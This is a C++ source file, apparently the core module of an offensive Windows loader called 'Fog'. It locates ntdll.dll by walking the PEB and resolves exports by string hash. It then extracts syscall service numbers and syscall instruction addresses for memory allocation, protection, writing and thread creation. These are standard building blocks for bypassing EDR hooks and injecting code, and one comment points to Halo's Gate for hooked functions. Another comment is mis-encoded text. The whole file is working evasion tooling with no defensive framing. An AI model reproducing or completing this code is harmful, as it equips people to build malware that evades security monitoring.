#include "Core.h"
#include <cctype>

// Register global variables for communication with ASM
extern "C" {
    uintptr_t g_syscallAddr = 0;
    DWORD g_ssn_allocate = 0;
    DWORD g_ssn_protect = 0;
    DWORD g_ssn_write = 0;
    DWORD g_ssn_thread = 0;
}

uintptr_t ntdllBase = 0;

namespace Fog::Core {

    DWORD HashString(const char* word) {
        DWORD hash = 4291;
        int c;
        while ((c = *word++)) {
            if (isupper(c)) c = c + 32;
            hash = ((hash << 5) + hash) + c;
        }
        return hash;
    }

    uintptr_t GetModuleBase(const wchar_t* moduleName) {
        uintptr_t peb = GetMyPeb();
        if (!peb) return 0;

        uintptr_t ldr = *(uintptr_t*)(peb + 0x18);
        uintptr_t anchor = (ldr + 0x10);
        uintptr_t current = *(uintptr_t*)anchor;

        do {
            uintptr_t bufferAddress = *(uintptr_t*)(current + 0x60);
            if (bufferAddress != 0) {
                wchar_t* dllName = (wchar_t*)bufferAddress;
                if (_wcsicmp(dllName, moduleName) == 0) {
                    return *(uintptr_t*)(current + 0x30);
                }
            }
            current = *(uintptr_t*)current;
        } while (current != anchor);

        return 0;
    }

    uintptr_t GetExportAddress(uintptr_t moduleBase, DWORD targetHash) {
        if (!moduleBase) return 0;

        DWORD PeStart = *(DWORD*)(moduleBase + 0x3C);
        DWORD exportRVA = *(DWORD*)(moduleBase + PeStart + 0x88);
        uintptr_t EDAddress = moduleBase + exportRVA;

        DWORD numNames = *(DWORD*)(EDAddress + 0x18);
        uintptr_t namesAddr = moduleBase + *(DWORD*)(EDAddress + 0x20);
        uintptr_t ordinalsAddr = moduleBase + *(DWORD*)(EDAddress + 0x24);
        uintptr_t functionsAddr = moduleBase + *(DWORD*)(EDAddress + 0x1C);

        for (DWORD i = 0; i < numNames; i++) {
            DWORD name = *(DWORD*)(namesAddr + i * 4);
            char* namestr = (char*)(moduleBase + name);
            if (HashString(namestr) == targetHash) {
                WORD ordinal = *(WORD*)(ordinalsAddr + i * 2);
                DWORD functionRVA = *(DWORD*)(functionsAddr + (ordinal * 4));
                return moduleBase + functionRVA;
            }
        }
        return 0;
    }

    DWORD ExtractSSN(uintptr_t address) {
        if (!address) return 0;

        const BYTE expected[] = { 0x4C, 0x8B, 0xD1, 0xB8 }; // mov r10, rcx; mov eax, SSN
        BYTE* mem = (BYTE*)address;

        if (memcmp(mem, expected, 4) == 0) {
            // »щем syscall (0x0F 0x05)
            for (size_t i = 0; i < 32; i++) {
                if (mem[i] == 0x0F && mem[i + 1] == 0x05) {
                    g_syscallAddr = address + i; // Save the jump address
                    break;
                }
            }
            return *(DWORD*)(address + 4); // We pull out the SSN number itself
        }
        return 0;// Hook found, Halo's Gate needed (for future reference)
    }
    bool Initialize() {
        ntdllBase = Fog::Core::GetModuleBase(L"ntdll.dll");
        if (!ntdllBase) return false;
        return true;
    }
}